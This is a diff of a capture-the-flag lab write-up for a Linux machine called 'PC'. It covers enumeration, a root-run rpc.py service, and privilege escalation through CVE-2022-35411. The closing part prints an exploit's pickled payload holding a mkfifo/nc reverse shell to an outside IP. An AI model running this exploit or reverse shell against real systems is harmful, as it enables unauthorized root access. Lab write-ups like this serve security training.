@@ -3,7 +3,7 @@
 # 🐧PC🐧
 ## Enumeration
 Nmap
-```
+```console
 $ nmap -p- -T4 -sV 192.168.148.210
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-10 21:58 AEDT
 
@@ -13,12 +13,12 @@ PORT     STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 port 8000 is a terminal of user
-```
+```console
 user@pc:/home/user$ id
 uid=1000(user) gid=1000(user) groups=1000(user)
 ```
 run linpeas on user and found there is a unusual file call rpc.py in /opt
-```
+```console
 
 ╔══════════╣ Unexpected in /opt (usually empty)
 total 16                                                                                                          
@@ -28,7 +28,7 @@ drwx--x--x  4 root root 4096 Jun 28  2023 containerd
 -rw-r--r--  1 root root  625 Aug 25  2023 rpc.py
 ```
 and there is port 65432 running locally
-```
+```console
 ╔══════════╣ Active Ports
 ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                      
 ══╣ Active Ports (netstat)                                                                                        
@@ -39,7 +39,7 @@ tcp        0      0 127.0.0.1:65432         0.0.0.0:*               LISTEN      
 ```
 the file is a script of port 65432 running by root  
 so if we can get the RCE of it we can get the root shell
-```
+```console
 user@pc:/opt$ cat rpc.py
 from typing import AsyncGenerator
 from typing_extensions import TypedDict
@@ -80,7 +80,7 @@ if __name__ == "__main__":
 search online and it is CVE-2022-35411 and found the RCE script of it  
 https://github.com/fuzzlove/CVE-2022-35411/blob/main/rpc-exploit.py  
 edit the reverse shell payload and upload the script to the machine and run it
-```
+```console
 user@pc:/home/user$ python3 rpcpy-exploit.py
 python3 rpcpy-exploit.py
 b'\x80\x04\x95j\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8cOrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.166 22 >/tmp/f\x94\x85\x94R\x94.'
